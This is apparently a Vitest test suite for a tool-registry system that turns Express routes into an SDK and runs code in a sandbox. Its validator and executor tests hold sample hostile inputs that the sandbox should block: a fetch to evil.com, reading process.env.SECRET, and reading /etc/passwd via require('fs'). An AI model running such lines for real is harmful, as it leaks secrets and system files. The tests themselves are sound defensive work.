import { describe, it, expect, beforeAll } from 'vitest';
import { resolve } from 'path';
import { ToolRegistry } from '../src/registry.js';
import { SearchIndex } from '../src/search.js';
import { SandboxExecutor, DirectExecutor } from '../src/executor.js';
import { validateCode } from '../src/parser.js';
import { generateToolTypes, formatSearchResults } from '../src/typegen.js';
import { buildSdkProxy, flattenProxy } from '../src/proxy.js';
import { CredentialStore } from '../src/auth.js';
import { expressAdapter } from '../adapters/express.js';
import type { ToolDefinition, SearchResult } from '../src/types.js';

const SAMPLE_SERVER = resolve(import.meta.dirname, 'fixtures/sample-server.js');

// ─── Express Adapter ─────────────────────────────────────────────

describe('Express Adapter', () => {
  let tools: ToolDefinition[];

  beforeAll(async () => {
    tools = await expressAdapter.parse(SAMPLE_SERVER, { domain: 'rentComps' });
  });

  it('discovers all 9 routes from sample server', () => {
    expect(tools.length).toBe(9);
  });

  it('extracts route paths and methods', () => {
    const routes = tools.map(t => `${t.method} ${t.route}`).sort();
    expect(routes).toContain('GET /api/properties');
    expect(routes).toContain('GET /api/properties/:id');
    expect(routes).toContain('POST /api/properties');
    expect(routes).toContain('PUT /api/properties/:id');
    expect(routes).toContain('DELETE /api/properties/:id');
    expect(routes).toContain('GET /api/properties/:propertyId/comps');
    expect(routes).toContain('POST /api/properties/:propertyId/comps');
    expect(routes).toContain('GET /api/stats/market');
    expect(routes).toContain('POST /api/rent-data/bulk-import');
  });

  it('generates camelCase tool names', () => {
    const names = tools.map(t => t.name).sort();
    expect(names).toContain('getProperties');
    expect(names).toContain('getPropertiesById');
    expect(names).toContain('createProperties');
    expect(names).toContain('createRentDataBulkImport');
  });

  it('marks GET/DELETE as readOnly, POST/PUT as write', () => {
    const getProps = tools.find(t => t.name === 'getProperties');
    expect(getProps?.readOnly).toBe(true);

    const createProps = tools.find(t => t.route === '/api/properties' && t.method === 'POST');
    expect(createProps?.readOnly).toBe(false);

    const updateProps = tools.find(t => t.method === 'PUT');
    expect(updateProps?.readOnly).toBe(false);
  });

  it('extracts route params as required parameters', () => {
    const getById = tools.find(t => t.route === '/api/properties/:id' && t.method === 'GET');
    expect(getById).toBeDefined();
    const idParam = getById!.parameters.find(p => p.name === 'id');
    expect(idParam).toBeDefined();
    expect(idParam!.required).toBe(true);
  });

  it('extracts body params from POST routes', () => {
    const createProps = tools.find(t => t.route === '/api/properties' && t.method === 'POST');
    expect(createProps).toBeDefined();
    expect(createProps!.parameters.length).toBeGreaterThan(0);
    const nameParam = createProps!.parameters.find(p => p.name === 'name');
    expect(nameParam).toBeDefined();
  });

  it('extracts query params from GET routes', () => {
    const getProps = tools.find(t => t.name === 'getProperties');
    expect(getProps).toBeDefined();
    const typeParam = getProps!.parameters.find(p => p.name === 'type');
    expect(typeParam).toBeDefined();
    expect(typeParam!.required).toBe(false);
  });

  it('sets domain on all tools', () => {
    for (const tool of tools) {
      expect(tool.domain).toBe('rentComps');
    }
  });
});

// ─── Search Index ────────────────────────────────────────────────

describe('Search Index', () => {
  let index: SearchIndex;
  let tools: ToolDefinition[];

  beforeAll(async () => {
    tools = await expressAdapter.parse(SAMPLE_SERVER, { domain: 'rentComps' });
    index = new SearchIndex();
    index.index(tools);
  });

  it('indexes all tools', () => {
    expect(index.size).toBe(tools.length);
  });

  it('finds properties by keyword search', () => {
    const results = index.search('properties');
    expect(results.length).toBeGreaterThan(0);
    expect(results[0].tool.name).toMatch(/properties/i);
  });

  it('finds rent data tools', () => {
    const results = index.search('rent data');
    expect(results.length).toBeGreaterThan(0);
  });

  it('finds comps endpoint', () => {
    const results = index.search('comps');
    expect(results.length).toBeGreaterThan(0);
  });

  it('finds market stats endpoint', () => {
    const results = index.search('stats market');
    expect(results.length).toBeGreaterThan(0);
  });

  it('returns type snippets with results', () => {
    const results = index.search('properties');
    expect(results[0].typeSnippet).toContain('Promise<');
  });

  it('returns empty for garbage query', () => {
    const results = index.search('xyzzy_nothing_matches_this');
    expect(results.length).toBe(0);
  });
});

// ─── Type Generation ─────────────────────────────────────────────

describe('Type Generation', () => {
  const mockTool: ToolDefinition = {
    name: 'getProperties',
    domain: 'rentComps',
    description: 'List all properties',
    parameters: [],
    returnType: 'Record<string, any>[]',
    readOnly: true,
    route: '/api/properties',
    method: 'GET',
  };

  it('generates correct function signature', () => {
    const sig = generateToolTypes(mockTool);
    expect(sig).toBe('getProperties(): Promise<Record<string, any>[]>');
  });

  it('generates signature with params', () => {
    const tool: ToolDefinition = {
      ...mockTool,
      name: 'getPropertyById',
      parameters: [{ name: 'id', type: 'number', required: true }],
    };
    const sig = generateToolTypes(tool);
    expect(sig).toBe('getPropertyById(params: { id: number }): Promise<Record<string, any>[]>');
  });

  it('marks optional params', () => {
    const tool: ToolDefinition = {
      ...mockTool,
      parameters: [
        { name: 'id', type: 'number', required: true },
        { name: 'name', type: 'string', required: false },
      ],
    };
    const sig = generateToolTypes(tool);
    expect(sig).toContain('id: number');
    expect(sig).toContain('name?: string');
  });

  it('formats full search results with SDK declaration', () => {
    const results: SearchResult[] = [
      { tool: mockTool, score: 1, typeSnippet: generateToolTypes(mockTool) },
    ];
    const formatted = formatSearchResults('carbon', results);
    expect(formatted).toContain('declare const sdk');
    expect(formatted).toContain('rentComps');
    expect(formatted).toContain('getProperties');
  });
});

// ─── AST Parser / Validator ──────────────────────────────────────

describe('Code Validator', () => {
  it('accepts valid SDK code', () => {
    const result = validateCode(`
      const props = await sdk.rentComps.getProperties();
      console.log(props.length);
    `);
    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  it('blocks require()', () => {
    const result = validateCode(`const fs = require('fs')`);
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('require');
  });

  it('blocks import declarations', () => {
    const result = validateCode(`import fs from 'fs'`);
    expect(result.valid).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
  });

  it('blocks process access', () => {
    const result = validateCode(`const x = process.env.SECRET`);
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('process');
  });

  it('blocks fetch', () => {
    const result = validateCode(`const r = fetch('http://evil.com')`);
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('fetch');
  });

  it('blocks eval', () => {
    const result = validateCode(`eval('alert(1)')`);
    expect(result.valid).toBe(false);
  });

  it('blocks dynamic import', () => {
    const result = validateCode(`const m = await import('./foo')`);
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('import');
  });

  it('reports parse errors', () => {
    const result = validateCode(`const x = {{{`);
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('Parse error');
  });
});

// ─── Executor ────────────────────────────────────────────────────

describe('SandboxExecutor', () => {
  const executor = new SandboxExecutor();

  it('executes basic code', async () => {
    const result = await executor.execute(
      `const x = 1 + 2; return x;`,
      {}
    );
    expect(result.success).toBe(true);
    expect(result.result).toBe(3);
  });

  it('captures console.log output', async () => {
    const result = await executor.execute(
      `console.log("hello"); console.log("world");`,
      {}
    );
    expect(result.success).toBe(true);
    expect(result.logs).toContain('hello');
    expect(result.logs).toContain('world');
  });

  it('calls SDK functions through the proxy', async () => {
    const mockFn = async (_params: Record<string, unknown>) => {
      return [{ id: 1, name: 'Riverside Apts' }];
    };

    const result = await executor.execute(
      `const props = await sdk.rentComps.getProperties();
       console.log(props.length + " properties");
       return props;`,
      { 'rentComps.getProperties': mockFn }
    );

    expect(result.success).toBe(true);
    expect(result.logs).toContain('1 properties');
    expect(result.result).toEqual([{ id: 1, name: 'Riverside Apts' }]);
  });

  it('passes params to SDK functions', async () => {
    let capturedParams: any;
    const mockFn = async (params: Record<string, unknown>) => {
      capturedParams = params;
      return { id: params.id, name: 'Riverside Apts' };
    };

    const result = await executor.execute(
      `const prop = await sdk.rentComps.getPropertyById({ id: 42 });
       return prop;`,
      { 'rentComps.getPropertyById': mockFn }
    );

    expect(result.success).toBe(true);
    expect(capturedParams).toEqual({ id: 42 });
    expect(result.result).toEqual({ id: 42, name: 'Riverside Apts' });
  });

  it('blocks dangerous code at AST level', async () => {
    const result = await executor.execute(
      `const fs = require('fs'); return fs.readFileSync('/etc/passwd');`,
      {}
    );
    expect(result.success).toBe(false);
    expect(result.error).toContain('require');
  });

  it('handles runtime errors gracefully', async () => {
    const result = await executor.execute(
      `throw new Error("oops");`,
      {}
    );
    expect(result.success).toBe(false);
    expect(result.error).toContain('oops');
  });

  it('reports duration', async () => {
    const result = await executor.execute(`return 1;`, {});
    expect(result.durationMs).toBeGreaterThanOrEqual(0);
    expect(result.durationMs).toBeLessThan(5000);
  });
});

// ─── Registry ────────────────────────────────────────────────────

describe('ToolRegistry', () => {
  it('loads tools from Express adapter', async () => {
    const registry = new ToolRegistry();
    registry.registerAdapter(expressAdapter);

    const count = await registry.loadDomain({
      name: 'rentComps',
      adapter: 'express',
      source: SAMPLE_SERVER,
    });

    expect(count).toBe(9);
    expect(registry.size).toBe(9);
    expect(registry.domains).toContain('rentComps');
  });

  it('retrieves tools by name', async () => {
    const registry = new ToolRegistry();
    registry.registerAdapter(expressAdapter);
    await registry.loadDomain({
      name: 'rentComps',
      adapter: 'express',
      source: SAMPLE_SERVER,
    });

    const tool = registry.getToolByName('getProperties');
    expect(tool).toBeDefined();
    expect(tool!.domain).toBe('rentComps');
  });

  it('throws for unknown adapter', async () => {
    const registry = new ToolRegistry();
    await expect(
      registry.loadDomain({ name: 'test', adapter: 'nonexistent', source: 'foo' })
    ).rejects.toThrow('No adapter registered');
  });
});

// ─── Full Pipeline (Adapter → Index → Search → Typegen → Execute) ─

describe('Full Pipeline', () => {
  let tools: ToolDefinition[];
  let index: SearchIndex;

  beforeAll(async () => {
    tools = await expressAdapter.parse(SAMPLE_SERVER, { domain: 'rentComps' });
    index = new SearchIndex();
    index.index(tools);
  });

  it('search → type generation → execute cycle works end-to-end', async () => {
    // Step 1: Search
    const results = index.search('properties');
    expect(results.length).toBeGreaterThan(0);

    // Step 2: Format types for LLM
    const formatted = formatSearchResults('carbon', results);
    expect(formatted).toContain('sdk');
    expect(formatted).toContain('getProperties');

    // Step 3: Execute code using a mock backend
    const executor = new SandboxExecutor();
    const mockGetProperties = async () => [
      { id: 1, name: 'Riverside Apts', units: 120 },
      { id: 2, name: 'Oak Park Place', units: 200 },
    ];

    const result = await executor.execute(
      `const props = await sdk.rentComps.getProperties();
       const totalUnits = props.reduce((sum, p) => sum + p.units, 0);
       console.log("Total units: " + totalUnits);
       return { count: props.length, totalUnits };`,
      { 'rentComps.getProperties': mockGetProperties }
    );

    expect(result.success).toBe(true);
    expect(result.result).toEqual({ count: 2, totalUnits: 320 });
    expect(result.logs).toContain('Total units: 320');
  });

  it('multi-tool code execution works', async () => {
    const executor = new SandboxExecutor();

    const mockGetProperties = async () => [
      { id: 1, name: 'Riverside Apts' },
      { id: 2, name: 'Oak Park Place' },
    ];

    const mockGetComps = async (params: Record<string, unknown>) => ([
      { comp_name: 'Comp A', rent: 1200 },
      { comp_name: 'Comp B', rent: 1350 },
    ]);

    const result = await executor.execute(
      `const props = await sdk.rentComps.getProperties();
       const comps = await sdk.rentComps.getComps({ propertyId: props[0].id });
       const avgRent = comps.reduce((s, c) => s + c.rent, 0) / comps.length;
       return { property: props[0].name, avgCompRent: avgRent };`,
      {
        'rentComps.getProperties': mockGetProperties,
        'rentComps.getComps': mockGetComps,
      }
    );

    expect(result.success).toBe(true);
    expect(result.result).toEqual({ property: 'Riverside Apts', avgCompRent: 1275 });
  });
});
